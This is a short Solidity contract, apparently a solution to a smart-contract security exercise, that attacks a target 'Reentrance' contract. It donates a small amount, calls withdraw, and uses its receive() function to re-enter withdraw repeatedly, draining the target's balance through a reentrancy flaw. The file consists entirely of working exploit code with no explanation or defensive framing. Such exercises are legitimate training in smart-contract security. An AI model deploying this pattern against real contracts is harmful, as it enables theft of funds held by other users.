// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    uint256 count = 1;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    receive() external payable {
        if (count <= 5) {
            Reentrance trance = Reentrance(contractAddress);
            trance.withdraw();
            count++;
        }
    }

    function hackContract() external {
        // Code me!
        Reentrance trance = Reentrance(contractAddress);
        trance.donate{value: 1}(address(this));
        trance.withdraw();
    }
}
